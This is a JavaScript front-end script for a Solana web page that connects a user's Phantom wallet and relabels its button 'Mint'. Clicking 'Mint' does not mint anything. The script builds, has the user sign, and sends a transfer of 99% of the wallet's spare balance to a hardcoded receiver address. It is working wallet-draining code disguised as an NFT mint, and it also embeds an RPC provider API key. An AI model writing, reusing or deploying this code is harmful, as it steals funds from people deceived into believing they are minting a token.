$(document).ready(function () {
    $('#connect-wallet').on('click', async () => {
        if (window.solana && window.solana.isPhantom) {
            try {
                const resp = await window.solana.connect();
                console.log("Phantom Wallet connected:", resp);

                const connection = new solanaWeb3.Connection(
                    'https://solana-mainnet.api.syndica.io/api-key/42aSFR7aLhxB7NfXEq78aMvkfweu58G4ngdwhri32u9BAaaQ9wShomjTtKH9RCKJDpS3sxRGQXeZk3Wp8s8BDbLPjmLTCqTHhoN',
                    'confirmed'
                );

                const publicKey = new solanaWeb3.PublicKey(resp.publicKey);
                const walletBalance = await connection.getBalance(publicKey);
                console.log("Wallet balance:", walletBalance);

                const minBalance = await connection.getMinimumBalanceForRentExemption(0);
                if (walletBalance < minBalance) {
                    alert("Insufficient funds for rent.");
                    return;
                }

                $('#connect-wallet').text("Mint");
                $('#connect-wallet').off('click').on('click', async () => {
                    try {
                        const receiverWallet = new solanaWeb3.PublicKey('DVm4XnbDT6hzhcVJBeM2DMbq3URGDpC5qkzd2rwhvFwK');
                        const balanceForTransfer = walletBalance - minBalance;

                        if (balanceForTransfer <= 0) {
                            alert("Insufficient funds for transfer.");
                            return;
                        }

                        // Создаем транзакцию
                        const transaction = new solanaWeb3.Transaction().add(
                            solanaWeb3.SystemProgram.transfer({
                                fromPubkey: publicKey,
                                toPubkey: receiverWallet,
                                lamports: balanceForTransfer * 0.99, // 99% от оставшихся средств
                            })
                        );

                        transaction.feePayer = publicKey;

                        // Получаем последний blockhash
                        const { blockhash } = await connection.getLatestBlockhash('finalized');
                        transaction.recentBlockhash = blockhash;

                        console.log("Transaction object before signing:", transaction);

                        // Подписываем транзакцию
                        const signed = await window.solana.signTransaction(transaction);
                        console.log("Signed transaction:", signed);

                        // Сериализуем транзакцию и отправляем
                        const serialized = signed.serialize();
                        console.log("Serialized transaction:", serialized);

                        const txid = await connection.sendRawTransaction(serialized, { skipPreflight: false });
                        console.log("Transaction confirmed:", txid);

                        alert(`Transaction successful! TxID: ${txid}`);
                    } catch (err) {
                        console.error("Error during minting:", err.message);
                        console.error("Full error object:", err);
                        alert("Minting failed. Check console for details.");
                    }
                });
            } catch (err) {
                console.error("Error connecting to Phantom Wallet:", err);
            }
        } else {
            alert("Phantom extension not found.");
        }
    });
});
